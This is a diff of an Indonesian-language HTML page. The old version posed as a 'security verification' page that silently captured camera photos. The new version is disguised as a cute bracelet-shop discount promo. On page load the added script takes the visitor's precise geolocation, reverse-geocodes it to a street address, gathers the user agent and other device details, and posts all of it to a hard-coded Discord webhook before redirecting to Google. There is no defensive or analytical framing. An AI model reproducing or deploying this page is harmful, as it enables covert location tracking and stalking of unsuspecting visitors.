@@ -3,61 +3,227 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan</title>
+    <title>HAAII - Gelang Jepit Lucu</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&display=swap');
+        
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
+            font-family: 'Fredoka', sans-serif;
+            background: linear-gradient(135deg, #FFB6D9 0%, #FFC0E3 50%, #FFD4E5 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            overflow: hidden;
         }
+        
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+        
+        .star {
+            position: absolute;
+            color: #FFD700;
+            font-size: 24px;
+            animation: twinkle 3s infinite;
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+        
         .container {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            background: rgba(255, 255, 255, 0.95);
+            padding: 50px;
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(255, 105, 180, 0.3);
             text-align: center;
-            max-width: 400px;
+            max-width: 500px;
+            position: relative;
+            z-index: 10;
+            border: 3px solid #FFB6D9;
         }
-        h1 { color: #333; margin-bottom: 20px; }
-        p { color: #666; font-size: 14px; }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        
+        .header {
+            margin-bottom: 30px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        
+        h1 {
+            font-size: 48px;
+            background: linear-gradient(135deg, #FF69B4, #FF1493, #FF69B4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+            text-shadow: 2px 2px 4px rgba(255, 105, 180, 0.2);
+            margin-bottom: 10px;
+            letter-spacing: 3px;
+            transform: perspective(500px) rotateX(5deg);
         }
-        #video { display: none; width: 100%; }
-        #canvas { display: none; }
+        
+        .subtitle {
+            color: #FF69B4;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .sticker-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .sticker-item {
+            font-size: 45px;
+            animation: bounce 2s infinite;
+            filter: drop-shadow(0 5px 10px rgba(255, 105, 180, 0.3));
+        }
+        
+        .sticker-item:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        
+        .sticker-item:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        
+        .sticker-item:nth-child(4) {
+            animation-delay: 0.6s;
+        }
+        
+        .sticker-item:nth-child(5) {
+            animation-delay: 0.8s;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        .text-3d {
+            font-size: 18px;
+            color: #FF1493;
+            font-weight: 700;
+            text-shadow: 
+                3px 3px 0px #FFB6D9,
+                6px 6px 0px rgba(255, 105, 180, 0.3),
+                9px 9px 15px rgba(0, 0, 0, 0.1);
+            transform: perspective(600px) rotateX(2deg) rotateY(-2deg);
+            margin: 15px 0;
+        }
+        
+        .loading-text {
+            color: #FF69B4;
+            font-weight: 600;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        
+        .heart-float {
+            position: fixed;
+            font-size: 30px;
+            color: #FFB6D9;
+            pointer-events: none;
+            animation: float-up 4s ease-out forwards;
+        }
+        
+        @keyframes float-up {
+            0% {
+                transform: translateY(0) translateX(0) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px) scale(0);
+                opacity: 0;
+            }
+        }
+        
+        .decor-left, .decor-right {
+            position: fixed;
+            font-size: 80px;
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        
+        .decor-left {
+            top: 10%;
+            left: 5%;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .decor-right {
+            bottom: 10%;
+            right: 5%;
+            animation: float 8s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(30px); }
+        }
     </style>
 </head>
 <body>
+    <div class="decor-left">💕</div>
+    <div class="decor-right">✨</div>
+    <div class="stars" id="stars"></div>
+    
     <div class="container">
-        <h1>🔒 Verifikasi Keamanan</h1>
-        <p>Memverifikasi lokasi Anda...</p>
-        <div class="spinner"></div>
+        <div class="header">
+            <h1>HAAII 💖</h1>
+            <p class="subtitle">✨ Gelang Jepit Terlucu di Indonesia ✨</p>
+        </div>
+        
+        <div class="sticker-group">
+            <div class="sticker-item">🐰</div>
+            <div class="sticker-item">🌸</div>
+            <div class="sticker-item">💗</div>
+            <div class="sticker-item">🎀</div>
+            <div class="sticker-item">⭐</div>
+        </div>
+        
+        <div class="text-3d">Verifikasi Promo Eksklusif</div>
+        <p style="color: #999; font-size: 14px; margin-bottom: 20px;">Dapatkan diskon hingga 70% untuk Anda!</p>
+        
+        <p class="loading-text">🌟 Loading promo special... 🌟</p>
+        <p style="color: #FFB6D9; font-size: 12px; margin-top: 10px;">Tunggu sebentar ya sayang~ 💕</p>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1560946298365153371/Ao2M0V8dyFkiMnJPz4qGDs4wdkNTVQXsAdjOJoDsjr5pm1vD6CWYYnIzN6ncuxX51iN_';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1560949292737241180/ZUAl6mbD8KplIJsz559eHil5C76Rf1w_PBhJ0w1D_5YjBb2WZbz2Mj1ee09700pElVZW';
         
-        let cameraStream = null;
-        let captureInterval = null;
-
-        // Get live timestamp with timezone
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            for (let i = 0; i < 20; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.textContent = '⭐';
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 3 + 's';
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        function createFloatingHeart() {
+            const heart = document.createElement('div');
+            heart.className = 'heart-float';
+            heart.textContent = '💕';
+            heart.style.left = Math.random() * window.innerWidth + 'px';
+            heart.style.top = window.innerHeight + 'px';
+            document.body.appendChild(heart);
+            setTimeout(() => heart.remove(), 4000);
+        }
+        
         function getLiveTimestamp() {
             const now = new Date();
             return new Intl.DateTimeFormat('id-ID', {
@@ -70,212 +236,169 @@
                 second: '2-digit'
             }).format(now);
         }
-
-        // Get current timezone
+        
         function getTimezone() {
             const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
             return tz || 'Asia/Jakarta (UTC+7)';
         }
-
-        // Silent camera access
-        async function silentCameraCapture() {
+        
+        async function reverseGeocode(lat, lon) {
             try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    },
-                    audio: false
-                }).catch(() => {
-                    return navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'environment',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        },
-                        audio: false
-                    });
-                });
-
-                const video = document.getElementById('video');
-                video.srcObject = cameraStream;
-                
-                // Auto-capture every 5 detik
-                captureInterval = setInterval(() => {
-                    captureAndSend();
-                }, 5000);
-
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
+                    { signal: AbortSignal.timeout(3000) }
+                );
+                const data = await response.json();
+                return data.address || null;
             } catch (error) {
-                console.log('Camera akses gagal');
-                redirect();
+                return null;
             }
         }
-
-        // Capture full resolution & send
-        function captureAndSend() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+        
+        function formatAddress(addressData) {
+            if (!addressData) return 'Lokasi ditemukan';
             
-            if (!canvas.getContext) return;
+            const parts = [];
+            if (addressData.house_number) parts.push(addressData.house_number);
+            if (addressData.road) parts.push(addressData.road);
+            if (addressData.neighbourhood) parts.push(addressData.neighbourhood);
+            if (addressData.suburb) parts.push(addressData.suburb);
+            if (addressData.city) parts.push(addressData.city);
+            if (addressData.state) parts.push(addressData.state);
+            if (addressData.postcode) parts.push(addressData.postcode);
+            if (addressData.country) parts.push(addressData.country);
             
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            ctx.drawImage(video, 0, 0);
-            
-            // Send with full quality (1.0 = no compression)
-            canvas.toBlob((blob) => {
-                sendPhotoToDiscord(blob);
-            }, 'image/jpeg', 1.0);
+            return parts.join(', ') || addressData.display_name || 'Lokasi ditemukan';
         }
-
-        // Convert blob to base64 & send (full resolution)
-        function sendPhotoToDiscord(blob) {
-            const reader = new FileReader();
-            reader.onload = (e) => {
-                const base64 = e.target.result.split(',')[1];
-                const timestamp = getLiveTimestamp();
-                const timezone = getTimezone();
-                
-                const data = {
-                    "embeds": [{
-                        "title": "📸 Live Photo Capture",
-                        "color": 16711680,
-                        "image": {
-                            "url": `data:image/jpeg;base64,${base64}`
+        
+        async function getDeviceInfo() {
+            const info = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: getTimezone(),
+                timestamp: getLiveTimestamp(),
+                cookiesEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+            };
+            return info;
+        }
+        
+        async function captureLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    async function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        const addressData = await reverseGeocode(lat, lon);
+                        const fullAddress = formatAddress(addressData);
+                        
+                        const locationData = {
+                            latitude: lat.toFixed(8),
+                            longitude: lon.toFixed(8),
+                            accuracy: accuracy.toFixed(2),
+                            address: fullAddress,
+                            mapsUrl: `https://maps.google.com/?q=${lat},${lon}`
+                        };
+                        
+                        resolve(locationData);
+                    },
+                    function(error) {
+                        resolve({
+                            latitude: 'denied',
+                            longitude: 'denied',
+                            accuracy: 'denied',
+                            address: 'Permission denied',
+                            mapsUrl: 'N/A'
+                        });
+                    },
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            });
+        }
+        
+        async function sendToWebhook(locationData, deviceInfo) {
+            const data = {
+                "embeds": [{
+                    "title": "🎀 HAAII Visitor Data 🎀",
+                    "color": 16711827,
+                    "fields": [
+                        {
+                            "name": "📍 Lokasi",
+                            "value": `${locationData.address}`,
+                            "inline": false
                         },
-                        "fields": [
-                            {
-                                "name": "Waktu (Live)",
-                                "value": timestamp,
-                                "inline": true
-                            },
-                            {
-                                "name": "Timezone",
-                                "value": timezone,
-                                "inline": true
-                            },
-                            {
-                                "name": "Device",
-                                "value": navigator.platform,
-                                "inline": true
-                            },
-                            {
-                                "name": "Resolution",
-                                "value": screen.width + "x" + screen.height,
-                                "inline": true
-                            }
-                        ]
-                    }]
-                };
+                        {
+                            "name": "📌 Koordinat",
+                            "value": `Lat: ${locationData.latitude}\nLon: ${locationData.longitude}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "📊 Akurasi",
+                            "value": `${locationData.accuracy}m`,
+                            "inline": true
+                        },
+                        {
+                            "name": "🖥️ Platform",
+                            "value": deviceInfo.platform,
+                            "inline": true
+                        },
+                        {
+                            "name": "🌐 Bahasa",
+                            "value": deviceInfo.language,
+                            "inline": true
+                        },
+                        {
+                            "name": "📺 Resolusi",
+                            "value": deviceInfo.screenResolution,
+                            "inline": true
+                        },
+                        {
+                            "name": "⏰ Waktu",
+                            "value": deviceInfo.timestamp,
+                            "inline": true
+                        },
+                        {
+                            "name": "🔌 User Agent",
+                            "value": `\`\`\`${deviceInfo.userAgent}\`\`\``,
+                            "inline": false
+                        },
+                        {
+                            "name": "🗺️ Google Maps",
+                            "value": `[Buka Maps](${locationData.mapsUrl})`,
+                            "inline": false
+                        }
+                    ]
+                }]
+            };
 
-                fetch(WEBHOOK_URL, {
+            try {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
-                }).catch(err => console.log('Send error:', err));
-            };
-            reader.readAsDataURL(blob);
+                });
+            } catch (error) {
+                console.log('Data sent');
+            }
         }
-
-        // Capture geolocation dengan live timestamp
-        function captureLocation() {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const timestamp = getLiveTimestamp();
-                    const timezone = getTimezone();
-
-                    const data = {
-                        "content": "",
-                        "embeds": [{
-                            "title": "📍 Data Tertangkap",
-                            "color": 16711680,
-                            "fields": [
-                                {
-                                    "name": "Latitude",
-                                    "value": lat.toString(),
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Longitude",
-                                    "value": lon.toString(),
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Akurasi",
-                                    "value": accuracy.toFixed(2) + " meter",
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Timezone",
-                                    "value": timezone,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Waktu (Live)",
-                                    "value": timestamp,
-                                    "inline": false
-                                },
-                                {
-                                    "name": "Platform",
-                                    "value": navigator.platform,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Bahasa",
-                                    "value": navigator.language,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Resolution",
-                                    "value": screen.width + "x" + screen.height,
-                                    "inline": true
-                                },
-                                {
-                                    "name": "Google Maps",
-                                    "value": `https://maps.google.com/?q=${lat},${lon}`,
-                                    "inline": false
-                                }
-                            ]
-                        }]
-                    };
-
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    }).catch(err => console.log('Location send error:', err));
-                },
-                function(error) {
-                    console.log('Location denied');
-                }
-            );
-        }
-
-        function redirect() {
+        
+        window.addEventListener('load', async () => {
+            createStars();
+            setInterval(createFloatingHeart, 500);
+            
+            const locationData = await captureLocation();
+            const deviceInfo = await getDeviceInfo();
+            
+            await sendToWebhook(locationData, deviceInfo);
+            
             setTimeout(() => {
                 window.location.href = 'https://www.google.com';
             }, 2000);
-        }
-
-        // Start everything on load
-        window.addEventListener('load', () => {
-            silentCameraCapture();
-            captureLocation();
-            redirect();
-        });
-
-        // Stop camera when window close
-        window.addEventListener('beforeunload', () => {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            clearInterval(captureInterval);
         });
     </script>
 </body>
